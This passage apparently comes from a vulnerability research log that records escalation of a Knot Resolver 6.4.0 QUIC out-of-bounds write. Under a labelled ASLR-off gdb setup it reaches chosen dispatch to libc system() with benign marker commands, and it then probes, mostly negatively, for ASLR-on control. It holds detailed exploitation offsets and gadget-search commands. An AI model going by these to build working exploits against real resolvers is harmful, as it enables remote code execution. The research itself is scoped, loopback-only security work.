- Safe input, same vulnerable build and command bytes but chosen RIP
  `0x12345678`: SIGSEGV at `0x12345678`, `/tmp/knot-r5-safe` absent.
- Fixed 6.4.1 ASan build on 8854 with the same wire bytes and a
  `touch /tmp/knot-r5-fixed` command: no marker, no ASan report, driver
  completed; the fixed `malformed` guard rejects the drifted frames.
- Evidence: `harness/r5-system-vuln.gdb.log`, `r5-rip-canon.gdb.log`,
  `r5-f6-bytes.gdb.log`, `r5-syms.gdb.log`, `r5-second.{gdb,driver}.log`,
  `r5-safe.{gdb,driver}.log`, `r5-fixed.{kresd,driver}.log`; scripts
  `r5_dispatch.py`, `r5-trace.gdb`, `r5-syms.gdb`.

### Honest ceiling
This is **author-observed rung 5 at a labeled ASLR-off, gdb-parent,
jemalloc/debug-build scope** with loopback wire input and two distinct benign
command side effects; it is not an ASLR-on or stock-build claim. The absolute
addresses come from this host's deterministic layout, not from an information
leak over the wire; none was demonstrated. gdb only ran the inferior and
observed it in the execution runs: no breakpoints, register writes or forced
calls. The call and its argument came from the overwritten cleanup pointer
and the F6 bytes. Witness W114 independently confirmed the dispatch and the
command side effect at `argoff 0x300`, but refuted the harness-default
`0x2F0` as a command-string location; rung 5 is therefore not
witness-ESTABLISHED verbatim at the default invocation, and no
ASLR-on/stock claim is made.

## Witness W114 rung-5 replay — MIXED (verdict #1376, 2026-11-22 10:14Z)

A fresh witness replayed the claim in its own `/tmp/w114-knot` tree with its
own pinned 6.4.0/6.4.1 jemalloc/debug builds (3/3 pins OK, build-tree
`quic_conn.c` SHA `3d992921…` identical to this lab's tree) on ports
18855/18854, with no repository edits.

- **ESTABLISHED on the witness binary**: oracle `buf=0x7ffff68a8800`,
  `slot1=0x7ffff68aa000`, `tls_native_handle==slot1`; `objdump` shows
  `call *0x110(%rbx)` at libgnutls `0x7350c` with the RDI load at `0x73500`.
  Chosen RIP `0x12345678` faults with `rdi=slot1+0x2f0`, frame 3
  `gnutls_deinit`, `quic_conn.c:884`; `system=0x7ffff7458750`.
- **CONTRADICTED at the harness default `argoff 0x2f0`**: the F6 bytes were
  correct at the breakpoint (fake `+0xb8=slot1+0x2f0`, `+0x110=system`,
  command intact), but a hardware watchpoint caught `gnutls_deinit` zeroing
  `slot1+0x2f0` before dispatch. At `system` entry RDI still pointed there
  but the string was empty: vfork detach, no marker, for both commands.
- **ESTABLISHED at corrected `argoff 0x300`** (inside the same 813-byte
  span): `system` received the intact string and created two distinct
  markers `/tmp/w114-r5-o300` and `/tmp/w114-r5-second300` with vfork
  detach. Safe control (chosen RIP `0x12345678`, same bytes at `0x300`)
  SIGSEGV with chosen RDI and no marker; the witness's fixed 6.4.1:18854
  with the same wires completed with no marker.

Resolution of the MIXED verdict: the author's two marker runs used explicit
`argv[4]=0x300` (recorded above as `+0xb8 = slot1+0x300`); the `0x2f0`
value belongs to the no-command RIP trace only. W114 therefore refutes using
the harness default `0x2f0` for command strings, not the reported command
runs. Command execution is witness-observed at `0x300` only. The witness's
fault backtrace has one fewer libgnutls frame than the author's (frame 2 vs
frame 3 `gnutls_deinit`), a likely cleanup-order difference preserved as an
open detail. No stock or ASLR-on rung-5 claim is contradicted or
established; the host sysctl was untouched on both sides.

## ASLR-on measurement (wake 13, 2026-11-22 ~18:5xZ) — reachability yes, control no

Two bounded probes on the pinned 6.4.0 jemalloc/debug build, both with
`set disable-randomization off` for the gdb inferior and host
`kernel.randomize_va_space` untouched.

- **Layout oracle** (`harness/gnutls-owner-aslr.gdb`,
  `harness/run_gnutls_aslr.sh`, logs `aslr-on-{1,2,3}.gdb.log`): three
  independently randomized runs gave `slot1 = 0x78f3e5caa000`,
  `0x73807d4aa000`, `0x70b73e8aa000`; all share low 20 bits `0xaa000`.
  `system` moved (`0x78f3e6858750`, `0x73807e058750`, `0x70b73f458750`) but
  all three share low 20 bits `0x58750`. The low 16 bits — and here even the
  low 20 bits — of the heap and libc addresses are stable; only the high
  bits are unknown.
- **Stale-address control** (`harness/r5-syms-aslr.gdb`,
  `harness/run_r5_aslr_control.sh`, `r5-aslr-on.{gdb,driver}.log`): the
  wake-12 command payload carrying the ASLR-off absolute addresses
  (`slot1=0x7ffff68aa000`, `system=0x7ffff7458750`) was sent to an
  ASLR-on inferior. No marker at `/tmp/knot-r5-aslr-on`. It still faulted
  in the same teardown path — `gnutls_deinit` → libgnutls `0x73690`, the
  chosen-address read — with `rsi = 0x7ffff68aa020` (the stale pointer
  written by the F6 bytes) and `rdi` a real heap pointer. In that run
  libgnutls base was `0x76d87bf21000` (`rip - 0x73690`) and libc
  `system = 0x76d87b658750`.

Interpretation: the OOB write and its reach into the live gnutls cleanup
loop are ASLR-independent; the stale pointer still steers the loop to a
fault. Chosen RIP/argument and command execution were **not** observed with
ASLR on — no address leak, no chosen control. The stable low bits make a
two-byte partial overwrite attractive, but this bug's `memcpy` writes a
contiguous span, so it cannot preserve the unknown high bytes of a live
pointer; that needs another primitive. Rung 5 stays author-observed at the
labeled ASLR-off scope only; no stock-build claim.


## Partial-overwrite feasibility (wake 14, 2026-11-22 ~21:0xZ) — negative in the reachable objects

Two ASLR-on inventories on the pinned 6.4.0 jemalloc/debug build, `set
disable-randomization off`, loopback only, host sysctl untouched
(`harness/aslr-pointer-inventory.gdb`, `harness/run_aslr_inventory.sh`, final
`harness/aslr-inventory.gdb.log`, driver log alongside). The extended run,
sampled at the same pre-F6 `wire_buf_consume` breakpoint as the earlier
oracle, gives `buf=0x7c25a48a8800`, `slot1=0x7c25a48aa000`, live extension
priv `priv=0x7c25a488cf00`, `system=0x7c25a5458750`; libc text mapped at
`0x7c25a5428000`–`0x7c25a55b1000` and libgnutls text at
`0x7c25a5b1f000`–`0x7c25a5c59000`.

Scanning 128 qwords at `slot1` (covering the full 814-byte OOB span) and 128
at `priv` — the objects the dispatch path reads — found:

- no pointer into libc text in either object;
- no pointer into `slot1`'s 64 KiB region (bits 16+ equal `0x48aa`), so no
  live pointer can be retargeted to the wire bytes at `slot1+0x300` by a
  two-byte patch;
- three pointers into `priv`'s 64 KiB region: the session's extension slots
  at `slot1+0x100/+0x108/+0x110` point to `0x7c25a488cf00/0x7c25a488d200/
  0x7c25a488d500`, all before `slot1` and outside the writable span.

An earlier sample of the same probe (its log replaced by the extended run)
likewise had no libc-text pointer; there the live priv's `+0x110` call target
was a libgnutls text pointer `0x7749cbd80490` and its `+0xb8` RDI source was
`0x7749ca8c9380`, a heap address outside `slot1`'s 64 KiB region.

Interpretation: in both sampled layouts, a low-order partial overwrite of any
pointer in the reachable objects reaches neither `system` (libc, an
independently randomized base) nor the command string (heap region `0x48aa`
or `0xca8a`). A three-byte patch would cross independently randomized
library/heap bases, so it does not preserve the unknown high bytes either.
The bug's contiguous `memcpy` starts at the adjacent allocation's first byte,
so it also cannot isolate the low bytes of a field deeper in the object.
This is a bounded negative result for these two object sets, not a proof for
every grooming; a different reachable object with a libc pointer, or an
information leak, is still needed for ASLR-on chosen control. Rung 5 stays
author-observed at the labeled ASLR-off scope only.

## Same-library PLT retarget check (wake 17, 2026-11-23 ~02:1xZ) — no direct command import

One escape from the wake-14 negative would be a live libgnutls text pointer in
the writable span whose low 16 bits could be patched to a libgnutls PLT stub:
the library base would stay unknown but the pointer's high bytes would survive.
The harness inferior maps `/usr/lib/x86_64-linux-gnu/libgnutls.so.30.37.1`
(SHA-256 `ddbae2995750875c07bc218d12a062d73f8250678f54dedda7e9be5068781c98`,
dpkg `libgnutls30t64 3.8.3-1.1ubuntu3.6`), confirmed in
`harness/aslr-inventory.gdb.log`. On that exact file:

- `readelf --dyn-syms -W LIB | grep ' UND ' | grep -E '(system|popen|exec[lvpe]*|posix_spawn|dlopen)'` → no matches: no direct command-execution import to retarget to.
- `objdump -d LIB | grep p11_kit_module_load@plt` → `0x34da0`; a module-load stub exists in the library, but the final 128-qword inventory has no libgnutls *text* pointer in the reachable objects to patch to it. Correction (wake 18): wake 14's earlier sample did have a libgnutls text pointer at `priv+0x110 = 0x7749cbd80490`; its mapping base was not recorded, so reachability of the stub from that pointer is UNKNOWN, not refuted.

The import check is a static negative for this library; the pointer-reachability
limb is UNKNOWN (correction above). No grade changed.


## ASLR nibble entropy across layouts (wake 18, 2026-11-23 ~14:5xZ) — 3-byte patch not deterministic

Wake 14's partial-overwrite negative was object-specific. A stronger property
is measurable from the three committed ASLR-on oracle logs
(`harness/aslr-on-{1,2,3}.gdb.log`, wake 13); each records the pre-F6 `slot1`
and `system` in the same inferior:

| layout | slot1 | low 20 | bits 20–23 | system | low 20 | bits 20–23 |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | `0x78f3e5caa000` | `0xaa000` | `0xc` | `0x78f3e6858750` | `0x58750` | `0x8` |
| 2 | `0x73807d4aa000` | `0xaa000` | `0x4` | `0x73807e058750` | `0x58750` | `0x0` |
| 3 | `0x70b73e8aa000` | `0xaa000` | `0x8` | `0x70b73f458750` | `0x58750` | `0x4` |

The low 20 bits are stable (slot1 `0xaa000`, `system` `0x58750`), which is
what made a 20-bit partial overwrite look plausible. Bits 20–23 are not:
`c/4/8` for the heap and `8/0/4` for libc across the three layouts (their
difference is a constant 4, but the absolute nibble is not fixed). A 2-byte
patch writes only known bits 0–15 and inherits the source pointer's differing
bits 16+; wake 14 measured no live pointer in the writable span sharing
slot1's bits 16+ (`0x48aa`). A 3-byte patch must also write bits 16–23,
including the varying nibble, so it cannot be deterministic; a 4-byte patch
destroys the unknown high bytes. This closes byte-granular partial overwrite
of both the heap command address and the libc call target on this host as a
one-shot deterministic move, independently of which objects are sampled.
Repeated attempts with a guessed nibble (1-in-16 per fresh layout) were not
tested and stay UNKNOWN.

The library-relative route survives this measurement: a libgnutls text
pointer's bits 12+ are fixed relative to its mapping base, so a low-16-bit
patch stays inside the same 64 KiB region. Whether the earlier sample's
`priv+0x110` pointer designates a function whose region holds a useful
same-library call target is UNKNOWN (base unrecorded); no grade changed.

## Live libgnutls pointers with recorded mapping base (wake 19, 2026-11-24 ~03:2xZ) — library-relative PLT route negative

Wake 17 left the pointer-reachability limb of the same-library PLT retarget
UNKNOWN because wake 14's sample of `priv+0x110 = 0x7749cbd80490` had no
recorded libgnutls base. Two fresh ASLR-on samples on the pinned 6.4.0
jemalloc/debug build (`harness/run_aslr_inventory_w19.sh a|b`, logs
`harness/aslr-inventory-w19-{a,b}.gdb.log`; gdb `disable-randomization off`,
loopback port 8855, host `kernel.randomize_va_space` untouched) now record
`info proc mappings` alongside the pre-F6 128-qword inventories:

| sample | slot1 | priv | libgnutls base (r--p, file offset 0) | `system` |
| --- | --- | --- | --- | --- |
| a | `0x761e190aa000` | `0x761e1908e700` | `0x761e1a480000` | `0x761e19c58750` |
| b | `0x7c0c15caa000` | `0x7c0c15c8ea00` | `0x7c0c17056000` | `0x7c0c16858750` |

Mapping-relative classification of every sampled qword gives the same result
in both layouts:

- the live extension priv holds four libgnutls **text** pointers at
  `+0xd0/+0xe0/+0xf0/+0x110` with invariant file offsets
  `0x12e5d0` (`gnutls_srp_base64_decode2`), `0x1338e0` /
  `0x137e70` (`gnutls_oid_to_sign` region) and `0x139780`
  (`gnutls_oid_to_digest` region), confirmed with `addr2line` on the pinned
  library `ddbae299…1c98`. The dispatch target at `priv+0x110` is therefore
  identified: file offset `0x137e70`, not the earlier unlocated `0x…490`.
- the 814-byte OOB span `slot1+0..+813` contains **no** libgnutls text pointer
  in either sample (only one libgnutls read-only data pointer at file offset
  `0x1e6e38`); `priv` itself sits `0x1b600`–`0x1b900` bytes before `slot1`,
  outside the copy. A partial overwrite of the live dispatch pointer is not
  reachable from this write in these layouts.
- even if such a pointer were reachable, a 2-byte patch preserves bits 16+
  and stays inside `base+0x120000..base+0x13ffff`; the only candidate
  same-library command stub, `p11_kit_module_load@plt` at `0x34da0`, is in a
  different 64 KiB region, and wake 17 found no command-execution import
  anywhere in libgnutls. This closes the specific retarget proposed at wake 17
  for the sampled objects. Indirect calls exist in the `0x12xxxx`/`0x13xxxx`
  regions but no command-execution target does; a different useful gadget is
  not claimed here.

Grade unchanged: rung 3 ESTABLISHED, rung 4 witness-ESTABLISHED, rung 5
author-observed ASLR-off / witness MIXED; ASLR-on chosen control UNKNOWN.
Wake 14's earlier `0x…490` sample remains unidentifiable (base unrecorded) but
no longer supports a claim: both fresh samples of the same object have the
identified `0x137e70` target and no text pointer in the writable span.

## Fixed-address route closed on the PIE lab binary (wake 21, 2026-11-25 ~04:2xZ)

Question: could ASLR-on chosen control avoid a pointer leak by dispatching to a
command stub at a fixed address in the main binary? Answer: **no** for this
build, before any question of a fixed-address command string arises. The
pinned 6.4.0 jemalloc/debug binary
`lab/frontier/knotresolver2shell/build/knot-resolver-6.4.0-jemalloc/jemalloc-build/daemon/kresd`
is `Type: DYN (Position-Independent Executable file)`, `Entry point address:
0xd870`, and `FLAGS_1 ... NOW PIE`. Its 456 undefined dynamic symbols contain
no `system`, `popen`, `exec*`, `posix_spawn`, `dlopen` or `fork`, and its `.plt`
contains no such command-execution entry. Reproduce with
`sh harness/check_fixed_address_route.sh`; committed output is
`harness/fixed-route-w21.out`.

So the chosen `call *0x110(%rbx)` has no fixed-address main-binary target on
this build. This does not change the wake-12 result, which used the runtime
`system` address obtained under the labeled gdb/ASLR-off condition, nor the
witness MIXED verdict. A stock/ASLR-on chosen-command route still needs an
information leak or a different reachable pointer whose high bytes need not be
guessed; both remain UNKNOWN. No grade change; no process, listener or host
state changed.

## Boundaries

No traffic off 127.0.0.1; no external scanning; no host sysctl changes; host
`kernel.randomize_va_space` stayed 2 in every run. For the wake-12 rung-5
attempt gdb disabled ASLR for the inferior only; that is a labeled lab
condition, not a stock-build claim. External claims are attributed, not
adopted.
